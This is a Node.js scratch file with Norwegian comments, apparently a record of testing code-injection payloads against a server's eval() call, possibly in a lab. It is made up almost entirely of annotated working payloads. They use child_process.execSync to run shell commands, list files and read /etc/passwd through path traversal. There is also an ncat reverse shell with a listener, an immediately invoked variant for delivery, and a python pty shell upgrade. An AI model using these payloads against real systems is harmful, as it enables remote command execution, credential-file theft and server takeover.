// Testing possible payloads for eval()

const execSync = require('child_process').execSync;
const output = execSync('ls', { encoding: 'utf-8' });
//console.log(output);

// Prøver å wrappe som funksjon:
function getFiles(){
	const execSync = require('child_process').execSync;
	const output = execSync('ls', { encoding: 'utf-8' });
	return output;
}

console.log(getFiles());

/* 
Testet og fungerende exploits!

function shellCmd(){const execSync = require('child_process').execSync; const out = execSync('SHELLCOMMAND', { encoding: 'utf-8'}); return out;} shellCmd()
* Access filesystem? YUP
function getFiles(){
    const execSync = require('child_process').execSync; 
    const output = execSync('ls', { encoding: 'utf-8' });
    return output; } 
    getFiles()

Shorthand?
() =>{
    const execSync = require('child_process').execSync; 
    const output = execSync('ls', { encoding: 'utf-8' });
    getFiles()                   
--- Does not work, must call function afterwards.

* Can I read /etc/passwd? Yup!
function getFiles(){const execSync = require('child_process').execSync; const output = execSync('cat ../../../../../../etc/passwd', { encoding: 'utf-8'}); return output;} getFiles()

* Can I get a reverse shell? Don't see why not.
payload for reverse shell: 
ncat 127.0.0.1 4444 -e /bin/bash
listener: nc -nlvp

Noe galt med formattering på payload? Må endre funksjonen kanskje?
FUNKER IKKE: function shellCmd(){const execSync = require('child_process').execSync; const out = execSync('ncat 127.0.0.1 4444 -e /bin/bash'}); return out;}

function shellCmd(){const execSync = require('child_process').execSync; execSync('ncat 127.0.0.1 4444 -e /bin/bash');} shellCmd()
BÆM, funker. Men ikke ideelt - serveren henger.

Hva med å starte netcat i bakgrunnen? 
function shellCmd(){const execSync = require('child_process').execSync; var out = execSync('ncat 127.0.0.1 4444 -e /bin/bash &'); return out;} shellCmd()
-> Hjelper ikke, for serveren henger til eval-kallet er ferdig, aka til netcat har terminert.

Spawn nice bash shell with python:
python3 -c 'import pty;pty.spawn("/bin/bash");'
*/


/* 11.04.2022
 *
 * Shorthand way to deliver payload, using IIFE (Immidiately Invoked Function Expression)
 * (function shellCmd(){const execSync = require('child_process').execSync; execSync('ncat 127.0.0.1 4444 -e /bin/bash');})();
 *
 *
 * Get files with return statement:
 * (function shellCmd(){const execSync = require('child_process').execSync; return execSync('ls');})();
 
 (function shellCmd(){const execSync = require('child_process').execSync; return execSync('cat ../../etc/passwd');})();
 */

